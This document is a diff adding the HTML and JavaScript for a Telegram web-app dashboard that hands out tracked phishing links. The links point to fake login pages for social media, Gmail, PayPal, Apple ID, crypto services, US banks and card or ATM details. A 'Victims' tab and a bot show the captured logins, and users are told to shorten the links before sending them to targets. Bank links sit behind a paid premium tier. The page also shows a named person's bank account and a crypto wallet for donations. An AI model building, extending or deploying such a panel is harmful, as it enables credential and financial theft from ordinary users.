@@ -1,0 +1,474 @@
+<!DOCTYPE html>
+<html lang="en" >
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Intelligent Linkbot - WebApp</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body, html {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to right, #0f2027, #203a43, #2c5364);
+      color: #eee;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      padding-bottom: 60px;
+    }
+    header {
+      background: #111;
+      padding: 18px 20px;
+      text-align: center;
+      font-weight: 700;
+      font-size: 1.6rem;
+      letter-spacing: 1.2px;
+      border-bottom: 1px solid #222;
+    }
+    main { flex-grow: 1; overflow-y: auto; padding: 15px 20px; }
+    .page { display: none; max-width: 600px; margin: 0 auto; }
+    .page.active { display: block; }
+    h2 { color: #00ff99; margin-bottom: 15px; text-align: center; font-weight: 700; }
+    p { line-height: 1.5; max-width: 600px; margin: 0 auto 15px auto; font-size: 1.05rem; }
+
+    ul.link-list { list-style: none; padding-left: 0; margin: 10px auto; max-width: 600px; }
+    ul.link-list li {
+      background: #222; margin: 12px 0; border-radius: 12px;
+      display: flex; align-items: center; padding: 12px 15px;
+      transition: background 0.3s ease; cursor: pointer;
+    }
+    ul.link-list li:hover { background: #00ff99; color: #000; }
+    ul.link-list li img {
+      height: 50px; width: 50px; object-fit: contain;
+      margin-right: 15px; border-radius: 8px; flex-shrink: 0;
+      border: 1.5px solid #00ff99; background: #111;
+    }
+    ul.link-list li a { color: inherit; text-decoration: none; font-weight: 600; font-size: 1.1rem; flex-grow: 1; }
+
+    .btn {
+      background: #00ff99; color: #000;
+      padding: 6px 12px; font-weight: 700;
+      border: none; border-radius: 12px; cursor: pointer;
+      font-size: 0.9rem; transition: background 0.3s ease;
+    }
+    .btn:hover { background: #00cc77; }
+    .btn.disabled { background: #666; cursor: not-allowed; color: #ccc; }
+
+    .donation-info {
+      max-width: 600px; margin: 0 auto; background: #222;
+      padding: 20px; border-radius: 12px; line-height: 1.5;
+      font-size: 1.05rem; text-align: center;
+    }
+    .donation-info strong { color: #00ff99; }
+    .crypto-address {
+      font-family: monospace; background: #111; padding: 10px;
+      border-radius: 8px; margin-top: 10px; user-select: all;
+      word-break: break-all;
+    }
+
+    .bottom-nav {
+      position: fixed; bottom: 0; left: 0; right: 0; height: 56px;
+      background: #111; border-top: 1px solid #222;
+      display: flex; justify-content: space-around; align-items: center;
+    }
+    .bottom-nav button {
+      background: none; border: none; color: #eee; font-size: 1.35rem;
+      display: flex; flex-direction: column; align-items: center;
+      cursor: pointer; transition: color 0.25s ease; width: 60px;
+    }
+    .bottom-nav button span { font-size: 0.75rem; margin-top: 2px; font-weight: 600; }
+    .bottom-nav button.active { color: #00ff99; font-weight: 700; }
+
+    @media (max-width: 400px) {
+      ul.link-list li { flex-direction: column; align-items: flex-start; }
+      ul.link-list li img { margin-bottom: 8px; margin-right: 0; }
+    }
+  </style>
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+  <header>Intelligent Dashboard</header>
+
+  <main>
+    <!-- Home Section -->
+    <section id="home" class="page active">
+<p>
+  <b>
+    Click on the "open" button to test your link before you send it to your clients, 
+    and also remember to shorten it in any link shorten website like 
+    <a href="#" onclick="openWithAd('https://bitly.com/')" style="color:pink;">bitly</a> 
+    or 
+    <a href="#" onclick="openWithAd('https://tinyurl.com/')" style="color:pink;">tinyurl</a> 
+    when you copy the link
+  </b>
+</p>
+
+<script>
+  function openWithAd(url) {
+    try {
+      if (typeof show_9830644 === "function") {
+        show_9830644(); // show Monetag ad
+        setTimeout(function() {
+          window.open(url, "_blank", "noopener"); // always open in new tab
+        }, 3000); // wait 3s before redirect (adjust if needed)
+      } else {
+        window.open(url, "_blank", "noopener");
+      }
+    } catch(e) {
+      window.open(url, "_blank", "noopener");
+    }
+  }
+</script>
+      <p>Open the bot to receive all your client login.</p>
+<button id="openBotBtnHome" class="btn">Click here to see all your client login</button>
+      <ul id="freeLinksList" class="link-list"></ul>
+    </section>
+    <!-- Premium Section -->
+    <section id="premium" class="page">
+      <h2>Premium Links</h2>
+      <div id="premiumContent"></div>
+      <p style="text-align:center; font-size:0.9rem; margin-top:20px; color:#aaa;">
+        Not a premium user? <br />
+        Message us to get premium access:<br />
+        <a href="https://t.me/inamyophisintlinkbot" target="_blank" style="color:#00ff99; font-weight:700;">@inamyophisintlinkbot</a>
+      </p>
+    </section>
+
+    <!-- Victim Section -->
+    <section id="victim" class="page" style="text-align:center;">
+      <h2>Your Victims</h2>
+      <p>Open the bot to view all your victims.</p>
+      <button id="openBotBtnVictim" class="btn">👉 Open Bot</button>
+    </section>
+
+    <!-- Donate Section -->
+    <section id="donate" class="page">
+      <h2>Support Our Project</h2>
+      <div class="donation-info" id="donationInfo"></div>
+    </section>
+  </main>
+<nav class="bottom-nav">
+  <button onclick="showMyAd(); switchPage('home')" id="navHome" class="active">🏠<span>Home</span></button>
+  <button onclick="switchPage('premium')" id="navPremium">🔒<span>Premium</span></button>
+  <button onclick="showMyAd(); switchPage('victim')" id="navVictim">👁️<span>Victim</span></button>
+  <button onclick="switchPage('donate')" id="navDonate">💰<span>Donate</span></button>
+  <a href="https://t.me/intelligentha/11" target="_blank">
+    <button id="navHelp">❓<span>Help</span></button>
+  </a>
+</nav>
+    <script src="//libtl.com/sdk.js" data-zone="9830644" data-sdk="show_9830644"></script>
+
+  <script>
+    function showMyAd() {
+  try {
+    show_9830644()
+      .then(() => {
+        console.log("✅ Ad watched!");
+      })
+      .catch(() => {
+        console.log("⚠️ Ad failed or skipped.");
+      });
+  } catch (e) {
+    console.error("Ad function not loaded yet", e);
+  }
+}
+  </script>
+  <script src="premiumlist.js"></script>
+  <script>
+    const tg = window.Telegram.WebApp;
+    tg.expand();
+    const user = tg.initDataUnsafe?.user || null;
+    const telegramId = user?.id || null;
+
+    const freeLinksList = document.getElementById('freeLinksList');
+    const premiumContent = document.getElementById('premiumContent');
+    const donationInfo = document.getElementById('donationInfo');
+
+    const navButtons = {
+      home: document.getElementById('navHome'),
+      premium: document.getElementById('navPremium'),
+      victim: document.getElementById('navVictim'),
+      donate: document.getElementById('navDonate')
+    };
+    const pages = {
+      home: document.getElementById('home'),
+      premium: document.getElementById('premium'),
+      victim: document.getElementById('victim'),
+      donate: document.getElementById('donate')
+    };
+
+    const freeLinks = [
+      { name: "Facebook", image: "https://rrloaty.github.io/intelligent/face.png", urlTemplate: "https://ilyelya.github.io/n/face.html?id={telegram-id}" },
+      { name: "Instagram", image: "https://rrloaty.github.io/intelligent/inst.png", urlTemplate: "https://ilyelya.github.io/n/inst.html?id={telegram-id}" },
+      { name: "Twitter(X)", image: "https://rrloaty.github.io/intelligent/X.png", urlTemplate: "https://ilyelya.github.io/n/X.html?id={telegram-id}" },
+      { name: "Gmail", image: "https://rrloaty.github.io/intelligent/gmai.png", urlTemplate: "https://ilyelya.github.io/n/gma.html?id={telegram-id}" },
+      { name: "Tiktok", image: "https://rrloaty.github.io/intelligent/tiktok.png", urlTemplate: "https://ilyelya.github.io/n/tiktok.html?id={telegram-id}" },
+      { name: "Cashapp", image: "https://rrloaty.github.io/intelligent/cash.png", urlTemplate: "https://ilyelya.github.io/n/cash.html?id={telegram-id}" },
+      //added codes goes here //
+             { name: "Paypal", image: "https://bbott52.github.io/Mobixhub/pa.png", urlTemplate: "https://bbott52.github.io/alb/pay.html?id={telegram-id}" },
+                   { name: "Crypto link", image: "https://bbott52.github.io/Mobixhub/cr.png", urlTemplate: "https://bbott52.github.io/alb/tr?id={telegram-id}" },
+                         { name: "USA/UK CC", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}" },
+                               { name: "Apple id", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://bbott52.github.io/alb/app.html?id={telegram-id}" },
+                               //another links added//
+                                     { name: "Facebook Vote", image: "https://rrloaty.github.io/intelligent/face.png", urlTemplate: "https://ilyelya.github.io/n/cvf.html?id={telegram-id}" },
+      { name: "Instagram Vote", image: "https://rrloaty.github.io/intelligent/inst.png", urlTemplate: "https://ilyelya.github.io/n/cvi.html?id={telegram-id}" },
+      { name: "Twitter(X) Vote", image: "https://rrloaty.github.io/intelligent/X.png", urlTemplate: "https://ilyelya.github.io/n/cvtw.html?id={telegram-id}" },
+      { name: "Gmail Vote", image: "https://rrloaty.github.io/intelligent/gmai.png", urlTemplate: "https://ilyelya.github.io/n/cvg.html?id={telegram-id}" },
+      { name: "Tiktok Vote", image: "https://rrloaty.github.io/intelligent/tiktok.png", urlTemplate: "https://ilyelya.github.io/n/cvt.html?id={telegram-id}" },
+      // The bellow should be premium
+      
+    ];
+    const premiumLinks = [
+      { name: "Crypto link", image: "https://bbott52.github.io/Mobixhub/cr.png", urlTemplate: "https://bbott52.github.io/alb/tr?id={telegram-id}" },
+      { name: "USA/UK Bank", image: "https://bbott52.github.io/Mobixhub/us.png", urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}" },
+      { name: "USA/UK Bank and CC", image: "https://bbott52.github.io/Mobixhub/uk.png", urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}" },
+      { name: "USA/UK CC", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}" },
+      { name: "Atm login for all country", image: "https://bbott52.github.io/Mobixhub/cc.png", urlTemplate: "https://bbott52.github.io/Mobixhub/?promo={telegram-id}" },
+      { name: "Wells fargo login", image: "https://bbott52.github.io/Mobixhub/we.png", urlTemplate: "https://bbott52.github.io/alb/we.html?id={telegram-id}" },
+      { name: "BOA login", image: "https://bbott52.github.io/Mobixhub/bo.png", urlTemplate: "https://bbott52.github.io/alb/bo.html?id={telegram-id}" },
+      { name: "Paypal login", image: "https://bbott52.github.io/Mobixhub/pa.png", urlTemplate: "https://bbott52.github.io/alb/pay.html?id={telegram-id}" },
+            { name: "Truist bank login", image: "https://bbott52.github.io/Mobixhub/ttr.jpg", urlTemplate: "https://bbott52.github.io/alb/truist.html?id={telegram-id}" },
+                  { name: "apple login", image: "https://bbott52.github.io/Mobixhub/app.jpg", urlTemplate: "https://bbott52.github.io/alb/app.html?id={telegram-id}" },
+    ];
+
+    function formatUrl(template) {
+      if (!telegramId) return "#";
+      return template.replace("{telegram-id}", telegramId);
+    }
+
+// Free links renderer (name visible, URL hidden)
+function renderFreeLinks() {
+  freeLinksList.innerHTML = "";
+  freeLinks.forEach(link => {
+    const li = document.createElement("li");
+    const img = document.createElement("img");
+    img.src = link.image;
+    img.alt = link.name;
+    const fullUrl = formatUrl(link.urlTemplate);
+
+    const nameText = document.createElement("div");
+    nameText.textContent = link.name;
+    nameText.style.flexGrow = "1";
+    nameText.style.marginRight = "15px";
+    nameText.style.fontWeight = "600";
+    nameText.style.fontSize = "1rem";
+
+    const copyBtn = document.createElement("button");
+    copyBtn.textContent = "Copy link";
+    copyBtn.className = "btn";
+    copyBtn.style.marginRight = "8px";
+    copyBtn.addEventListener("click", () => {
+      // ✅ Copy first
+      navigator.clipboard.writeText(fullUrl).then(() => {
+        copyBtn.textContent = "Copied!";
+        setTimeout(() => (copyBtn.textContent = "Copy link"), 1500);
+
+        // ✅ Show ad after copy
+        showMyAd().catch(() => {
+          console.warn("Ad failed after copy");
+        });
+      });
+    });
+
+    const openBtn = document.createElement("button");
+    openBtn.textContent = "Open";
+    openBtn.className = "btn";
+    openBtn.addEventListener("click", () => {
+      // ✅ Show ad first, then redirect
+      showMyAd()
+        .then(() => {
+          window.open(fullUrl, "_blank", "noopener");
+        })
+        .catch(() => {
+          window.open(fullUrl, "_blank", "noopener");
+        });
+    });
+
+    li.appendChild(img);
+    li.appendChild(nameText);
+    li.appendChild(copyBtn);
+    li.appendChild(openBtn);
+    freeLinksList.appendChild(li);
+  });
+}
+    // Premium links renderer
+    function renderPremiumLinks() {
+      if (!telegramId) {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Cannot detect your Telegram ID. Please open this WebApp inside Telegram.</p>`;
+        return;
+      }
+      if (typeof premiumUsers === "undefined") {
+        premiumContent.innerHTML = `<p style="color:#ff6666; text-align:center;">Premium list is missing. Please check premiumlist.js.</p>`;
+        return;
+      }
+
+      if (premiumUsers.includes(telegramId)) {
+        // ✅ If premium → show the links with copy + open
+        premiumContent.innerHTML = "";
+        const ul = document.createElement("ul");
+        ul.className = "link-list";
+
+        premiumLinks.forEach(link => {
+          const li = document.createElement("li");
+
+          const img = document.createElement("img");
+          img.src = link.image;
+          img.alt = link.name;
+
+          const fullUrl = formatUrl(link.urlTemplate);
+
+          const nameText = document.createElement("div");
+          nameText.textContent = link.name;
+          nameText.style.flexGrow = "1";
+          nameText.style.marginRight = "15px";
+          nameText.style.fontWeight = "600";
+          nameText.style.fontSize = "1rem";
+
+          const copyBtn = document.createElement("button");
+          copyBtn.textContent = "Copy";
+          copyBtn.className = "btn";
+          copyBtn.style.marginRight = "8px";
+          copyBtn.addEventListener("click", () => {
+            navigator.clipboard.writeText(fullUrl).then(() => {
+              copyBtn.textContent = "Copied!";
+              setTimeout(() => (copyBtn.textContent = "Copy"), 1500);
+            });
+          });
+
+          const openBtn = document.createElement("button");
+          openBtn.textContent = "Open";
+          openBtn.className = "btn";
+          openBtn.addEventListener("click", () => {
+            window.open(fullUrl, "_blank", "noopener");
+          });
+
+          li.appendChild(img);
+          li.appendChild(nameText);
+          li.appendChild(copyBtn);
+          li.appendChild(openBtn);
+
+          ul.appendChild(li);
+        });
+
+        premiumContent.appendChild(ul);
+
+      } else {
+    // ❌ If NOT premium → show your upgrade message
+    premiumContent.innerHTML = `
+      <div style="max-width:500px;margin:20px auto;padding:16px;border-radius:16px;background:#151933;color:#e9ecff;font-family:system-ui,Roboto,Arial;">
+        <div style="position:relative;aspect-ratio:16/9;background:#0c0f20;border-radius:12px;overflow:hidden;">
+          <img src="https://images.unsplash.com/photo-1545239351-1141bd82e8a6?q=80&w=1200&auto=format&fit=crop" alt="Premium" style="width:100%;height:100%;object-fit:cover;display:block;">
+          <span style="position:absolute;top:12px;left:12px;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;font-weight:700;font-size:12px;padding:6px 10px;border-radius:999px;letter-spacing:.3px;">PREMIUM</span>
+        </div>
+    
+        <h3 style="margin:14px 0 8px;font-size:18px;font-weight:700;display:flex;align-items:center;gap:6px;">
+          <span>🔒</span> Bank, Credit/Debit card Crypto and many more link
+        </h3>
+        <p style="margin:0 0 12px;color:#97a0c3;font-size:14px;">
+          Go premium before you can copy or paste this link.
+        </p>
+    
+        <div style="display:flex;gap:8px;align-items:center;">
+          <input type="text" value="https://example.com/your-premium-link" disabled
+                 style="flex:1;padding:10px;border-radius:10px;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.06);color:#b9c0e0;font-size:14px;-webkit-text-security:disc;">
+          <button disabled style="padding:10px 14px;border:none;border-radius:10px;background:#6c8cff;color:#0a0e22;font-weight:700;cursor:not-allowed;opacity:.6;">Copy</button>
+        </div>
+    
+        <div style="margin-top:14px;padding:10px;border:1px dashed rgba(245,198,115,.5);background:rgba(255,213,133,.08);border-radius:10px;font-size:13px;display:flex;gap:10px;align-items:center;">
+          Access locked. Upgrade to unlock this link.
+          <a href="https://t.me/inamyophisintlinkbot" target="_blank" rel="noopener noreferrer"
+             style="margin-left:auto;background:linear-gradient(135deg,#f5c673,#d89b2b);color:#1a1205;padding:8px 12px;border-radius:8px;font-weight:700;text-decoration:none;">
+            Go Premium
+          </a>
+        </div>
+      </div>
+    `;
+      }
+    }
+
+    // ✅ Updated event listeners for both buttons
+    function isUserInNigeria() {
+      return new Date().getTimezoneOffset() === -60;
+    }
+    function renderDonationInfo() {
+      if (isUserInNigeria()) {
+        donationInfo.innerHTML = `
+          <p><strong>Donation Account (Nigeria):</strong></p>
+          <p>Account Number: <strong>9114301708</strong><br/>Bank: <strong>Opay</strong><br/>Account Name: <strong>Olatunji Abdumalik Ayomide</strong></p>`;
+      } else {
+        donationInfo.innerHTML = `
+          <p><strong>Donate with crypto (BNB, USDT, BEP20):</strong></p>
+          <p class="crypto-address">0xbBcc409872bC2441400735624638F3D67DAa7C4C</p>`;
+      }
+    }
+
+    function switchPage(pageKey) {
+      Object.keys(pages).forEach(key => {
+        pages[key].classList.toggle("active", key === pageKey);
+        navButtons[key].classList.toggle("active", key === pageKey);
+      });
+    }
+    Object.entries(navButtons).forEach(([key, btn]) => {
+      btn.addEventListener("click", () => switchPage(key));
+    });
+
+    renderFreeLinks();
+    renderPremiumLinks();
+    renderDonationInfo();
+  </script>
+<script>
+  // ✅ function to show ad
+  function showMyAd() {
+    try {
+      return show_9830644()
+        .then(() => {
+          console.log("✅ Ad watched!");
+        })
+        .catch(() => {
+          console.log("⚠️ Ad failed or skipped.");
+          throw new Error("Ad failed");
+        });
+    } catch (e) {
+      console.error("Ad function not loaded yet", e);
+      return Promise.reject(e);
+    }
+  }
+
+  // ✅ Home button (Click here to see all your client login)
+  document.getElementById("openBotBtnHome").addEventListener("click", () => {
+    showMyAd()
+      .then(() => {
+        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
+      })
+      .catch(() => {
+        // Even if ad fails → still open bot
+        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
+      });
+  });
+
+  // ✅ Victim button (Open Bot)
+  document.getElementById("openBotBtnVictim").addEventListener("click", () => {
+    showMyAd()
+      .then(() => {
+        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
+      })
+      .catch(() => {
+        window.open("https://t.me/intelligentverificationlinkbot?start=start", "_blank");
+      });
+  });
+</script>
+<script>
+  // ✅ Show ad AFTER WebApp finishes loading (with small delay)
+  window.addEventListener("load", () => {
+    setTimeout(() => {
+      showMyAd()
+        .then(() => {
+          console.log("Ad shown after WebApp load ✅");
+        })
+        .catch(() => {
+          console.warn("Ad failed after WebApp load ❌");
+        });
+    }, 3000); // ⏳ wait 3s after load (you can change the delay)
+  });
+</script>
+</body>
+</html> 
